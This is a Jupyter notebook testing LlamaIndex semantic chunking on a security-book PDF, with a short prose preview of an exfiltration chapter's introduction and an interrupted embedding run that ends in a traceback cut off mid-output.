{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "593ade06",
   "metadata": {},
   "source": [
    "# Semantic Chunking with LlamaIndex\n",
    "\n",
    "This notebook demonstrates how to use LlamaIndex's semantic chunking to intelligently split PDF documents based on semantic similarity rather than fixed chunk sizes.\n",
    "\n",
    "Semantic chunking adaptively picks breakpoints between sentences using embedding similarity, ensuring chunks contain semantically related content."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "79859b42",
   "metadata": {},
   "outputs": [],
   "source": [
    "# Import required libraries\n",
    "import os\n",
    "from llama_index.core import SimpleDirectoryReader, VectorStoreIndex\n",
    "from llama_index.core.node_parser import SentenceSplitter, SemanticSplitterNodeParser\n",
    "from llama_index.embeddings.openai import OpenAIEmbedding"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b741b887",
   "metadata": {},
   "outputs": [],
   "source": [
    "from dotenv import load_dotenv\n",
    "import os\n",
    "from llama_index.llms.azure_openai import AzureOpenAI\n",
    "from llama_index.embeddings.azure_openai import AzureOpenAIEmbedding\n",
    "\n",
    "load_dotenv()\n",
    "\n",
    "api_key = os.environ.get('OPENAI_API_KEY')\n",
    "azure_endpoint = os.environ.get('OPENAI_API_BASE')\n",
    "deployment_name = os.environ.get('LLAMAINDEX_DEPLOYMENT_NAME')\n",
    "api_version = \"2024-02-15-preview\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 41,
   "id": "3ab01675",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Loaded 1 document(s)\n",
      "Document content preview: 9\n",
      "FUN WITH EXFILTRATION\n",
      "Gaining access to a target network is only \n",
      "a part of the battle. To make use of your \n",
      "access, you want to be able to exfiltrate \n",
      "documents, spreadsheets, or other bits of data \n",
      "from the target system. Depending on the defense \n",
      "mechanisms in place, this last part of your attack can \n",
      "prove to be tricky. There might be local or remote \n",
      "systems (or a combination of both) that work to vali -\n",
      "date processes that open remote connections as well \n",
      "as determine whether those processes should be able \n",
      "to send information or initiate connections outside of \n",
      "the internal network.\n",
      "\n",
      "\n",
      "140   Chapter 9\n",
      "In this chapter, we’ll create tools that enable you to exfiltrate encrypted \n",
      "data. First, we’ll write a script to encrypt and decrypt files. We’ll then use \n",
      "that script to encrypt information and transfer it from the system by using \n",
      "three methods: email, file transfers, and posts to a web server. For each \n",
      "of these methods, we’ll write both a platform-independent tool and a \n",
      "Wind...\n"
     ]
    }
   ],
   "source": [
    "from llama_index.core import Document\n",
    "\n",
    "# file_name = \"C:\\\\temp\\\\blackhatpython2ndedition.pdf\"\n",
    "file_name = \"C:\\\\temp\\\\blackhatpython.pdf\"\n",
    "\n",
    "# Load with default behavior (one doc per page)\n",
    "documents = SimpleDirectoryReader(input_files=[file_name]).load_data()\n",
    "\n",
    "# Combine all pages into one document\n",
    "combined_text = \"\\n\\n\".join([doc.text for doc in documents])\n",
    "combined_document = Document(text=combined_text)\n",
    "\n",
    "# Replace the document list with single combined document\n",
    "documents = [combined_document]\n",
    "\n",
    "print(f\"Loaded {len(documents)} document(s)\")\n",
    "print(f\"Document content preview: {documents[0].text[:1000]}...\")"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "edbd2e8d",
   "metadata": {},
   "source": [
    "### Key points:\n",
    "\n",
    "No built-in max token/character parameter: The SemanticSplitterNodeParser does not currently expose a parameter to set a hard maximum chunk size in tokens or characters.\n",
    "\n",
    "Known limitation: This is a recognized issue in the LlamaIndex community, and users have reported that chunks exceeding model limits can cause errors during embedding or inference.\n",
    "\n",
    "Workarounds:\n",
    "\n",
    "- Custom subclassing: You can subclass SemanticSplitterNodeParser to add a post-processing step that checks chunk sizes and further splits any that exceed your desired limit. Example approaches and code snippets for this workaround are provided by the community.\n",
    "\n",
    "- Safety net pattern: One common pattern is to use a secondary, simpler splitter (e.g., SentenceSplitter) as a fallback to break up oversized chunks after semantic splitting"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "3797d492",
   "metadata": {},
   "outputs": [],
   "source": [
    "embed_model = AzureOpenAIEmbedding(\n",
    "    model=\"text-embedding-3-small\",\n",
    "    deployment_name=\"text-embedding-3-small\",\n",
    "    api_key=api_key,\n",
    "    azure_endpoint=azure_endpoint,\n",
    "    api_version=api_version,\n",
    ")\n",
    "\n",
    "# Configure semantic splitter\n",
    "splitter = SemanticSplitterNodeParser(\n",
    "    buffer_size=1,  # Number of sentences to group together when evaluating semantic similarity\n",
    "    breakpoint_percentile_threshold=90,  # Percentile threshold for determining breakpoints\n",
    "    embed_model=embed_model\n",
    ")\n",
    "\n",
    "# Create baseline splitter for comparison\n",
    "base_splitter = SentenceSplitter(chunk_size=512)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 51,
   "id": "0a3d3a00",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Generating semantic chunks...\n"
     ]
    },
    {
     "ename": "KeyboardInterrupt",
     "evalue": "",
     "output_type": "error",
     "traceback": [
      "\u001b[31m---------------------------------------------------------------------------\u001b[39m",
      "\u001b[31mKeyboardInterrupt\u001b[39m                         Traceback (most recent call last)",
      "\u001b[36mCell\u001b[39m\u001b[36m \u001b[39m\u001b[32mIn[51]\u001b[39m\u001b[32m, line 3\u001b[39m\n\u001b[32m      1\u001b[39m \u001b[38;5;66;03m# Generate semantic chunks\u001b[39;00m\n\u001b[32m      2\u001b[39m \u001b[38;5;28mprint\u001b[39m(\u001b[33m\"\u001b[39m\u001b[33mGenerating semantic chunks...\u001b[39m\u001b[33m\"\u001b[39m)\n\u001b[32m----> \u001b[39m\u001b[32m3\u001b[39m semantic_nodes = \u001b[43msplitter\u001b[49m\u001b[43m.\u001b[49m\u001b[43mget_nodes_from_documents\u001b[49m\u001b[43m(\u001b[49m\u001b[43mdocuments\u001b[49m\u001b[43m)\u001b[49m\n\u001b[32m      5\u001b[39m \u001b[38;5;28mprint\u001b[39m(\u001b[33m\"\u001b[39m\u001b[33mGenerating baseline chunks...\u001b[39m\u001b[33m\"\u001b[39m)\n\u001b[32m      6\u001b[39m baseline_nodes = base_splitter.get_nodes_from_documents(documents)\n",
      "\u001b[36mFile \u001b[39m\u001b[32ma:\\Develop\\github\\ai-notebooks\\python\\pywrapper\\Lib\\site-packages\\llama_index\\core\\node_parser\\interface.py:165\u001b[39m, in \u001b[36mNodeParser.get_nodes_from_documents\u001b[39m\u001b[34m(self, documents, show_progress, **kwargs)\u001b[39m\n\u001b[32m    160\u001b[39m doc_id_to_document = {doc.id_: doc \u001b[38;5;28;01mfor\u001b[39;00m doc \u001b[38;5;129;01min\u001b[39;00m documents}\n\u001b[32m    162\u001b[39m \u001b[38;5;28;01mwith\u001b[39;00m \u001b[38;5;28mself\u001b[39m.callback_manager.event(\n\u001b[32m    163\u001b[39m     CBEventType.NODE_PARSING, payload={EventPayload.DOCUMENTS: documents}\n\u001b[32m    164\u001b[39m ) \u001b[38;5;28;01mas\u001b[39;00m event:\n\u001b[32m--> \u001b[39m\u001b[32m165\u001b[39m     nodes = \u001b[38;5;28;43mself\u001b[39;49m\u001b[43m.\u001b[49m\u001b[43m_parse_nodes\u001b[49m\u001b[43m(\u001b[49m\u001b[43mdocuments\u001b[49m\u001b[43m,\u001b[49m\u001b[43m \u001b[49m\u001b[43mshow_progress\u001b[49m\u001b[43m=\u001b[49m\u001b[43mshow_progress\u001b[49m\u001b[43m,\u001b[49m\u001b[43m \u001b[49m\u001b[43m*\u001b[49m\u001b[43m*\u001b[49m\u001b[43mkwargs\u001b[49m\u001b[43m)\u001b[49m\n\u001b[32m    166\u001b[39m     nodes = \u001b[38;5;28mself\u001b[39m._postprocess_parsed_nodes(nodes, doc_id_to_document)\n\u001b[32m    168\u001b[39m     event.on_end({EventPayload.NODES: nodes})\n",
      "\u001b[36mFile \u001b[39m\u001b[32ma:\\Develop\\github\\ai-notebooks\\python\\pywrapper\\Lib\\site-packages\\llama_index_instrumentation\\dispatcher.py:319\u001b[39m, in \u001b[36mDispatcher.span.<locals>.wrapper\u001b[39m\u001b[34m(func, instance, args, kwargs)\u001b[39m\n\u001b[32m    316\u001b[39m             _logger.debug(\u001b[33mf\u001b[39m\u001b[33m\"\u001b[39m\u001b[33mFailed to reset active_span_id: \u001b[39m\u001b[38;5;132;01m{\u001b[39;00me\u001b[38;5;132;01m}\u001b[39;00m\u001b[33m\"\u001b[39m)\n\u001b[32m    318\u001b[39m \u001b[38;5;28;01mtry\u001b[39;00m:\n\u001b[32m--> \u001b[39m\u001b[32m319\u001b[39m     result = \u001b[43mfunc\u001b[49m\u001b[43m(\u001b[49m\u001b[43m*\u001b[49m\u001b[43margs\u001b[49m\u001b[43m,\u001b[49m\u001b[43m \u001b[49m\u001b[43m*\u001b[49m\u001b[43m*\u001b[49m\u001b[43mkwargs\u001b[49m\u001b[43m)\u001b[49m\n\u001b[32m    320\u001b[39m     \u001b[38;5;28;01mif\u001b[39;00m \u001b[38;5;28misinstance\u001b[39m(result, asyncio.Future):\n\u001b[32m    321\u001b[39m         \u001b[38;5;66;03m# If the result is a Future, wrap it\u001b[39;00m\n\u001b[32m    322\u001b[39m         new_future = asyncio.ensure_future(result)\n",
      "\u001b[36mFile \u001b[39m\u001b[32ma:\\Develop\\github\\ai-notebooks\\python\\pywrapper\\Lib\\site-packages\\llama_index\\core\\node_parser\\text\\semantic_splitter.py:136\u001b[39m, in \u001b[36mSemanticSplitterNodeParser._parse_nodes\u001b[39m\u001b[34m(self, nodes, show_progress, **kwargs)\u001b[39m\n\u001b[32m    133\u001b[39m nodes_with_progress = get_tqdm_iterable(nodes, show_progress, \u001b[33m\"\u001b[39m\u001b[33mParsing nodes\u001b[39m\u001b[33m\"\u001b[39m)\n\u001b[32m    135\u001b[39m \u001b[38;5;28;01mfor\u001b[39;00m node \u001b[38;5;129;01min\u001b[39;00m nodes_with_progress:\n\u001b[32m--> \u001b[39m\u001b[32m136\u001b[39m     nodes = \u001b[38;5;28;43mself\u001b[39;49m\u001b[43m.\u001b[49m\u001b[43mbuild_semantic_nodes_from_documents\u001b[49m\u001b[43m(\u001b[49m\u001b[43m[\u001b[49m\u001b[43mnode\u001b[49m\u001b[43m]\u001b[49m\u001b[43m,\u001b[49m\u001b[43m \u001b[49m\u001b[43mshow_progress\u001b[49m\u001b[43m)\u001b[49m\n\u001b[32m    137\u001b[39m     all_nodes.extend(nodes)\n\u001b[32m    139\u001b[39m \u001b[38;5;28;01mreturn\u001b[39;00m all_nodes\n",
      "\u001b[36mFile \u001b[39m\u001b[32ma:\\Develop\\github\\ai-notebooks\\python\\pywrapper\\Lib\\site-packages\\llama_index\\core\\node_parser\\text\\semantic_splitter.py:172\u001b[39m, in \u001b[36mSemanticSplitterNodeParser.build_semantic_nodes_from_documents\u001b[39m\u001b[34m(self, documents, show_progress)\u001b[39m\n\u001b[32m    168\u001b[39m text_splits = \u001b[38;5;28mself\u001b[39m.sentence_splitter(text)\n\u001b[32m    170\u001b[39m sentences = \u001b[38;5;28mself\u001b[39m._build_sentence_groups(text_splits)\n\u001b[32m--> \u001b[39m\u001b[32m172\u001b[39m combined_sentence_embeddings = \u001b[38;5;28;43mself\u001b[39;49m\u001b[43m.\u001b[49m\u001b[43membed_model\u001b[49m\u001b[43m.\u001b[49m\u001b[43mget_text_embedding_batch\u001b[49m\u001b[43m(\u001b[49m\n\u001b[32m    173\u001b[39m \u001b[43m    \u001b[49m\u001b[43m[\u001b[49m\u001b[43ms\u001b[49m\u001b[43m[\u001b[49m\u001b[33;43m\"\u001b[39;49m\u001b[33;43mcombined_sentence\u001b[39;49m\u001b[33;43m\"\u001b[39;49m\u001b[43m]\u001b[49m\u001b[43m \u001b[49m\u001b[38;5;28;43;01mfor\u001b[39;49;00m\u001b[43m \u001b[49m\u001b[43ms\u001b[49m\u001b[43m \u001b[49m\u001b[38;5;129;43;01min\u001b[39;49;00m\u001b[43m \u001b[49m\u001b[43msentences\u001b[49m\u001b[43m]\u001b[49m\u001b[43m,\u001b[49m\n\u001b[32m    174\u001b[39m \u001b[43m    \u001b[49m\u001b[43mshow_progress\u001b[49m\u001b[43m=\u001b[49m\u001b[43mshow_progress\u001b[49m\u001b[43m,\u001b[49m\n\u001b[32m    175\u001b[39m \u001b[43m\u001b[49m\u001b[43m)\u001b[49m\n\u001b[32m    177\u001b[39m \u001b[38;5;28;01mfor\u001b[39;00m i, embedding \u001b[38;5;129;01min\u001b[39;00m \u001b[38;5;28menumerate\u001b[39m(combined_sentence_embeddings):\n\u001b[32m    178\u001b[39m     sentences[i][\u001b[33m\"\u001b[39m\u001b[33mcombined_sentence_embedding\u001b[39m\u001b[33m\"\u001b[39m] = embedding\n",
      "\u001b[36mFile \u001b[39m\u001b[32ma:\\Develop\\github\\ai-notebooks\\python\\pywrapper\\Lib\\site-packages\\llama_index_instrumentation\\dispatcher.py:319\u001b[39m, in \u001b[36mDispatcher.span.<locals>.wrapper\u001b[39m\u001b[34m(func, instance, args, kwargs)\u001b[39m\n\u001b[32m    316\u001b[39m             _logger.debug(\u001b[33mf\u001b[39m\u001b[33m\"\u001b[39m\u001b[33mFailed to reset active_span_id: \u001b[39m\u001b[38;5;132;01m{\u001b[39;00me\u001b[38;5;132;01m}\u001b[39;00m\u001b[33m\"\u001b[39m)\n\u001b[32m    318\u001b[39m \u001b[38;5;28;01mtry\u001b[39;00m:\n\u001b[32m--> \u001b[39m\u001b[32m319\u001b[39m     result = \u001b[43mfunc\u001b[49m\u001b[43m(\u001b[49m\u001b[43m*\u001b[49m\u001b[43margs\u001b[49m\u001b[43m,\u001b[49m\u001b[43m \u001b[49m\u001b[43m*\u001b[49m\u001b[43m*\u001b[49m\u001b[43mkwargs\u001b[49m\u001b[43m)\u001b[49m\n\u001b[32m    320\u001b[39m     \u001b[38;5;28;01mif\u001b[39;00m \u001b[38;5;28misinstance\u001b[39m(result, asyncio.Future):\n\u001b[32m    321\u001b[39m         \u001b[38;5;66;03m# If the result is a Future, wrap it\u001b[39;00m\n\u001b[32m    322\u001b[39m         new_future = asyncio.ensure_future(result)\n",
      "\u001b[36mFile \u001b[39m\u001b[32ma:\\Develop\\github\\ai-notebooks\\python\\pywrapper\\Lib\\site-packages\\llama_index\\core\\base\\embeddings\\base.py:406\u001b[39m, in \u001b[36mBaseEmbedding.get_text_embedding_batch\u001b[39m\u001b[34m(self, texts, show_progress, **kwargs)\u001b[39m\n\u001b[32m    401\u001b[39m \u001b[38;5;28;01mwith\u001b[39;00m \u001b[38;5;28mself\u001b[39m.callback_manager.event(\n\u001b[32m    402\u001b[39m     CBEventType.EMBEDDING,\n\u001b[32m    403\u001b[39m     payload={EventPayload.SERIALIZED: \u001b[38;5;28mself\u001b[39m.to_dict()},\n\u001b[32m    404\u001b[39m ) \u001b[38;5;28;01mas\u001b[39;00m event:\n\u001b[32m    405\u001b[39m     \u001b[38;5;28;01mif\u001b[39;00m \u001b[38;5;129;01mnot\u001b[39;00m \u001b[38;5;28mself\u001b[39m.embeddings_cache:\n\u001b[32m--> \u001b[39m\u001b[32m406\u001b[39m         embeddings = \u001b[38;5;28;43mself\u001b[39;49m\u001b[43m.\u001b[49m\u001b[43m_get_text_embeddings\u001b[49m\u001b[43m(\u001b[49m\u001b[43mcur_batch\u001b[49m\u001b[43m)\u001b[49m\n\u001b[32m    407\u001b[39m     \u001b[38;5;28;01melif\u001b[39;00m \u001b[38;5;28mself\u001b[39m.embeddings_cache \u001b[38;5;129;01mis\u001b[39;00m \u001b[38;5;129;01mnot\u001b[39;00m \u001b[38;5;28;01mNone\u001b[39;00m:\n\u001b[32m    408\u001b[39m         embeddings = []\n",
      "\u001b[36mFile \u001b[39m\u001b[32ma:\\Develop\\github\\ai-notebooks\\python\\pywrapper\\Lib\\site-packages\\llama_index\\embeddings\\openai\\base.py:465\u001b[39m, in \u001b[36mOpenAIEmbedding._get_text_embeddings\u001b[39m\u001b[34m(self, texts)\u001b[39m\n\u001b[32m    456\u001b[39m \u001b[38;5;129m@retry_decorator\u001b[39m\n\u001b[32m    457\u001b[39m \u001b[38;5;28;01mdef\u001b[39;00m\u001b[38;5;250m \u001b[39m\u001b[34m_retryable_get_embeddings\u001b[39m():\n\u001b[32m    458\u001b[39m     \u001b[38;5;28;01mreturn\u001b[39;00m get_embeddings(\n\u001b[32m    459\u001b[39m         client,\n\u001b[32m    460\u001b[39m         texts,\n\u001b[32m    461\u001b[39m         engine=\u001b[38;5;28mself\u001b[39m._text_engine,\n\u001b[32m    462\u001b[39m         **\u001b[38;5;28mself\u001b[39m.additional_kwargs,\n\u001b[32m    463\u001b[39m     )\n\u001b[32m--> \u001b[39m\u001b[32m465\u001b[39m \u001b[38;5;28;01mreturn\u001b[39;00m \u001b[43m_retryable_get_embeddings\u001b[49m\u001b[43m(\u001b[49m\u001b[43m)\u001b[49m\n",
      "\u001b[36mFile \u001b[39m\u001b[32ma:\\Develop\\github\\ai-notebooks\\python\\pywrapper\\Lib\\site-packages\\tenacity\\__init__.py:338\u001b[39m, in \u001b[36mBaseRetrying.wraps.<locals>.wrapped_f\u001b[39m\u001b[34m(*args, **kw)\u001b[39m\n\u001b[32m    336\u001b[39m copy = \u001b[38;5;28mself\u001b[39m.copy()\n\u001b[32m    337\u001b[39m wrapped_f.statistics = copy.statistics  \u001b[38;5;66;03m# type: ignore[attr-defined]\u001b[39;00m\n\u001b[32m--> \u001b[39m\u001b[32m338\u001b[39m \u001b[38;5;28;01mreturn\u001b[39;00m \u001b[43mcopy\u001b[49m\u001b[43m(\u001b[49m\u001b[43mf\u001b[49m\u001b[43m,\u001b[49m\u001b[43m \u001b[49m\u001b[43m*\u001b[49m\u001b[43margs\u001b[49m\u001b[43m,\u001b[49m\u001b[43m \u001b[49m\u001b[43m*\u001b[49m\u001b[43m*\u001b[49m\u001b[43mkw\u001b[49m\u001b[43m)\u001b[49m\n",
      "\u001b[36mFile \u001b[39m\u001b[32ma:\\Develop\\github\\ai-notebooks\\python\\pywrapper\\Lib\\site-packages\\tenacity\\__init__.py:477\u001b[39m, in \u001b[36mRetrying.__call__\u001b[39m\u001b[34m(self, fn, *args, **kwargs)\u001b[39m\n\u001b[32m    475\u001b[39m retry_state = RetryCallState(retry_object=\u001b[38;5;28mself\u001b[39m, fn=fn, args=args, kwargs=kwargs)\n\u001b[32m    476\u001b[39m \u001b[38;5;28;01mwhile\u001b[39;00m \u001b[38;5;28;01mTrue\u001b[39;00m:\n\u001b[32m--> \u001b[39m\u001b[32m477\u001b[39m     do = \u001b[38;5;28;43mself\u001b[39;49m\u001b[43m.\u001b[49m\u001b[43miter\u001b[49m\u001b[43m(\u001b[49m\u001b[43mretry_state\u001b[49m\u001b[43m=\u001b[49m\u001b[43mretry_state\u001b[49m\u001b[43m)\u001b[49m\n\u001b[32m    478\u001b[39m     \u001b[38;5;28;01mif\u001b[39;00m \u001b[38;5;28misinstance\u001b[39m(do, DoAttempt):\n\u001b[32m    479\u001b[39m         \u001b[38;5;28;01mtry\u001b[39;00m:\n",
      "\u001b[36mFile \u001b[39m\u001b[32ma:\\Develop\\github\\ai-notebooks\\python\\pywrapper\\Lib\\site-packages\\tenacity\\__init__.py:378\u001b[39m, in \u001b[36mBaseRetrying.iter\u001b[39m\u001b[34m(self, retry_state)\u001b[39m\n\u001b[32m    376\u001b[39m result = \u001b[38;5;28;01mNone\u001b[39;00m\n\u001b[32m    377\u001b[39m \u001b[38;5;28;01mfor\u001b[39;00m action \u001b[38;5;129;01min\u001b[39;00m \u001b[38;5;28mself\u001b[39m.iter_state.actions:\n\u001b[32m--> \u001b[39m\u001b[32m378\u001b[39m     result = \u001b[43maction\u001b[49m\u001b[43m(\u001b[49m\u001b[43mretry_state\u001b[49m\u001b[43m)\u001b[49m\n\u001b[32m    379\u001b[39m \u001b[38;5;28;01mreturn\u001b[39;00m result\n",
      "\u001b[36mFile \u001b[39m\u001b[32ma:\\Develop\\github\\ai-notebooks\\python\\pywrapper\\Lib\\site-packages\\tenacity\\__init__.py:400\u001b[39m, in \u001b[36mBaseRetrying._post_retry_check_actions.<locals>.<lambda>\u001b[39m\u001b[34m(rs)\u001b[39m\n\u001b[32m    398\u001b[39m \u001b[38;5;28;01mdef\u001b[39;00m\u001b[38;5;250m \u001b[39m\u001b[34m_post_retry_check_actions\u001b[39m(\u001b[38;5;28mself\u001b[39m, retry_state: \u001b[33m\"\u001b[39m\u001b[33mRetryCallState\u001b[39m\u001b[33m\"\u001b[39m) -> \u001b[38;5;28;01mNone\u001b[39;00m:\n\u001b[32m    399\u001b[39m     \u001b[38;5;28;01mif\u001b[39;00m \u001b[38;5;129;01mnot\u001b[39;00m (\u001b[38;5;28mself\u001b[39m.iter_state.is_explicit_retry \u001b[38;5;129;01mor\u001b[39;00m \u001b[38;5;28mself\u001b[39m.iter_state.retry_run_result):\n\u001b[32m--> \u001b[39m\u001b[32m400\u001b[39m         \u001b[38;5;28mself\u001b[39m._add_action_func(\u001b[38;5;28;01mlambda\u001b[39;00m rs: \u001b[43mrs\u001b[49m\u001b[43m.\u001b[49m\u001b[43moutcome\u001b[49m\u001b[43m.\u001b[49m\u001b[43mresult\u001b[49m\u001b[43m(\u001b[49m\u001b[43m)\u001b[49m)\n\u001b[32m    401\u001b[39m         \u001b[38;5;28;01mreturn\u001b[39;00m\n\u001b[32m    403\u001b[39m     \u001b[38;5;28;01mif\u001b[39;00m \u001b[38;5;28mself\u001b[39m.after \u001b[38;5;129;01mis\u001b[39;00m \u001b[38;5;129;01mnot\u001b[39;00m \u001b[38;5;28;01mNone\u001b[39;00m:\n",
      "\u001b[36mFile \u001b[39m\u001b[32m~\\AppData\\Local\\Programs\\Python\\Python312\\Lib\\concurrent\\futures\\_base.py:449\u001b[39m, in \u001b[36mFuture.result\u001b[39m\u001b[34m(self, timeout)\u001b[39m\n\u001b[32m    447\u001b[39m     \u001b[38;5;28;01mraise\u001b[39;00m CancelledError()\n\u001b[32m    448\u001b[39m \u001b[38;5;28;01melif\u001b[39;00m \u001b[38;5;28mself\u001b[39m._state == FINISHED:\n\u001b[32m--> \u001b[39m\u001b[32m449\u001b[39m     \u001b[38;5;28;01mreturn\u001b[39;00m \u001b[38;5;28;43mself\u001b[39;49m\u001b[43m.\u001b[49m\u001b[43m__get_result\u001b[49m\u001b[43m(\u001b[49m\u001b[43m)\u001b[49m\n\u001b[32m    451\u001b[39m \u001b[38;5;28mself\u001b[39m._condition.wait(timeout)\n\u001b[32m    453\u001b[39m \u001b[38;5;28;01mif\u001b[39;00m \u001b[38;5;28mself\u001b[39m._state \u001b[38;5;129;01min\u001b[39;00m [CANCELLED, CANCELLED_AND_NOTIFIED]:\n",
      "\u001b[36mFile \u001b[39m\u001b[32m~\\AppData\\Local\\Programs\\Python\\Python312\\Lib\\concurrent\\futures\\_base.py:401\u001b[39m, in \u001b[36mFuture.__get_result\u001b[39m\u001b[34m(self)\u001b[39m\n\u001b[32m    399\u001b[39m \u001b[38;5;28;01mif\u001b[39;00m \u001b[38;5;28mself\u001b[39m._exception:\n\u001b[32m    400\u001b[39m     \u001b[38;5;28;01mtry\u001b[39;00m:\n\u001b[32m--> \u001b[39m\u001b[32m401\u001b[39m         \u001b[38;5;28;01mraise\u001b[39;00m \u001b[38;5;28mself\u001b[39m._exception\n\u001b[32m    402\u001b[39m     \u001b[38;5;28;01mfinally\u001b[39;00m:\n\u001b[32m    403\u001b[39m         \u001b[38;5;66;03m# Break a reference cycle with the exception in self._exception\u001b[39;00m\n\u001b[32m    404\u001b[39m         \u001b[38;5;28mself\u001b[39m = \u001b[38;5;28;01mNone\u001b[39;00m\n",
      "\u001b[36mFile \u001b[39m\u001b[32ma:\\Develop\\github\\ai-notebooks\\python\\pywrapper\\Lib\\site-packages\\tenacity\\__init__.py:480\u001b[39m, in \u001b[36mRetrying.__call__\u001b[39m\u001b[34m(self, fn, *args, **kwargs)\u001b[39m\n\u001b[32m    478\u001b[39m \u001b[38;5;28;01mif\u001b[39;00m \u001b[38;5;28misinstance\u001b[39m(do, DoAttempt):\n\u001b[32m    479\u001b[39m     \u001b[38;5;28;01mtry\u001b[39;00m:\n\u001b[32m--> \u001b[39m\u001b[32m480\u001b[39m         result = \u001b[43mfn\u001b[49m\u001b[43m(\u001b[49m\u001b[43m*\u001b[49m\u001b[43margs\u001b[49m\u001b[43m,\u001b[49m\u001b[43m \u001b[49m\u001b[43m*\u001b[49m\u001b[43m*\u001b[49m\u001b[43mkwargs\u001b[49m\u001b[43m)\u001b[49m\n\u001b[32m    481\u001b[39m     \u001b[38;5;28;01mexcept\u001b[39;00m \u001b[38;5;167;01mBaseException\u001b[39;00m:  \u001b[38;5;66;03m# noqa: B902\u001b[39;00m\n\u001b[32m    482\u001b[39m         retry_state.set_exception(sys.exc_info())  \u001b[38;5;66;03m# type: ignore[arg-type]\u001b[39;00m\n",
      "\u001b[36mFile \u001b[39m\u001b[32ma:\\Develop\\github\\ai-notebooks\\python\\pywrapper\\Lib\\site-packages\\llama_index\\embeddings\\openai\\base.py:458\u001b[39m, in \u001b[36mOpenAIEmbedding._get_text_embeddings.<locals>._retryable_get_embeddings\u001b[39m\u001b[34m()\u001b[39m\n\u001b[32m    456\u001b[39m \u001b[38;5;129m@retry_decorator\u001b[39m\n\u001b[32m    457\u001b[39m \u001b[38;5;28;01mdef\u001b[39;00m\u001b[38;5;250m \u001b[39m\u001b[34m_retryable_get_embeddings\u001b[39m():\n\u001b[32m--> \u001b[39m\u001b[32m458\u001b[39m     \u001b[38;5;28;01mreturn\u001b[39;00m \u001b[43mget_embeddings\u001b[49m\u001b[43m(\u001b[49m\n\u001b[32m    459\u001b[39m \u001b[43m        \u001b[49m\u001b[43mclient\u001b[49m\u001b[43m,\u001b[49m\n\u001b[32m    460\u001b[39m \u001b[43m        \u001b[49m\u001b[43mtexts\u001b[49m\u001b[43m,\u001b[49m\n\u001b[32m    461\u001b[39m \u001b[43m        \u001b[49m\u001b[43mengine\u001b[49m\u001b[43m=\u001b[49m\u001b[38;5;28;43mself\u001b[39;49m\u001b[43m.\u001b[49m\u001b[43m_text_engine\u001b[49m\u001b[43m,\u001b[49m\n\u001b[32m    462\u001b[39m \u001b[43m        \u001b[49m\u001b[43m*\u001b[49m\u001b[43m*\u001b[49m\u001b[38;5;28;43mself\u001b[39;49m\u001b[43m.\u001b[49m\u001b[43madditional_kwargs\u001b[49m\u001b[43m,\u001b[49m\n\u001b[32m    463\u001b[39m \u001b[43m    \u001b[49m\u001b[43m)\u001b[49m\n",
      "\u001b[36mFile \u001b[39m\u001b[32ma:\\Develop\\github\\ai-notebooks\\python\\pywrapper\\Lib\\site-packages\\llama_index\\embeddings\\openai\\base.py:169\u001b[39m, in \u001b[36mget_embeddings\u001b[39m\u001b[34m(client, list_of_text, engine, **kwargs)\u001b[39m\n\u001b[32m    165\u001b[39m \u001b[38;5;28;01massert\u001b[39;00m \u001b[38;5;28mlen\u001b[39m(list_of_text) <= \u001b[32m2048\u001b[39m, \u001b[33m\"\u001b[39m\u001b[33mThe batch size should not be larger than 2048.\u001b[39m\u001b[33m\"\u001b[39m\n\u001b[32m    167\u001b[39m list_of_text = [text.replace(\u001b[33m\"\u001b[39m\u001b[38;5;130;01m\\n\u001b[39;00m\u001b[33m\"\u001b[39m, \u001b[33m\"\u001b[39m\u001b[33m \u001b[39m\u001b[33m\"\u001b[39m) \u001b[38;5;28;01mfor\u001b[39;00m text \u001b[38;5;129;01min\u001b[39;00m list_of_text]\n\u001b[32m--> \u001b[39m\u001b[32m169\u001b[39m data = \u001b[43mclient\u001b[49m\u001b[43m.\u001b[49m\u001b[43membeddings\u001b[49m\u001b[43m.\u001b[49m\u001b[43mcreate\u001b[49m\u001b[43m(\u001b[49m\u001b[38;5;28;43minput\u001b[39;49m\u001b[43m=\u001b[49m\u001b[43mlist_of_text\u001b[49m\u001b[43m,\u001b[49m\u001b[43m \u001b[49m\u001b[43mmodel\u001b[49m\u001b[43m=\u001b[49m\u001b[43mengine\u001b[49m\u001b[43m,\u001b[49m\u001b[43m \u001b[49m\u001b[43m*\u001b[49m\u001b[43m*\u001b[49m\u001b[43mkwargs\u001b[49m\u001b[43m)\u001b[49m.data\n\u001b[32m    170\u001b[39m \u001b[38;5;28;01mreturn\u001b[39;00m [d.embedding \u001b[38;5;28;01mfor\u001b[39;00m d \u001b[38;5;129;01min\u001b[39;00m data]\n",
      "\u001b[36mFile \u001b[39m\u001b[32ma:\\Develop\\github\\ai-notebooks\\python\\pywrapper\\Lib\\site-packages\\openai\\resources\\embeddings.py:129\u001b[39m, in \u001b[36mEmbeddings.create\u001b[39m\u001b[34m(self, input, model, dimensions, encoding_format, user, extra_headers, extra_query, extra_body, timeout)\u001b[39m\n\u001b[32m    123\u001b[39m             embedding.embedding = np.frombuffer(  \u001b[38;5;66;03m# type: ignore[no-untyped-call]\u001b[39;00m\n\u001b[32m    124\u001b[39m                 base64.b64decode(data), dtype=\u001b[33m\"\u001b[39m\u001b[33mfloat32\u001b[39m\u001b[33m\"\u001b[39m\n\u001b[32m    125\u001b[39m             ).tolist()\n\u001b[32m    127\u001b[39m     \u001b[38;5;28;01mreturn\u001b[39;00m obj\n\u001b[32m--> \u001b[39m\u001b[32m129\u001b[39m \u001b[38;5;28;01mreturn\u001b[39;00m \u001b[38;5;28;43mself\u001b[39;49m\u001b[43m.\u001b[49m\u001b[43m_post\u001b[49m\u001b[43m(\u001b[49m\n\u001b[32m    130\u001b[39m \u001b[43m    \u001b[49m\u001b[33;43m\"\u001b[39;49m\u001b[33;43m/embeddings\u001b[39;49m\u001b[33;43m\"\u001b[39;49m\u001b[43m,\u001b[49m\n\u001b[32m    131\u001b[39m \u001b[43m    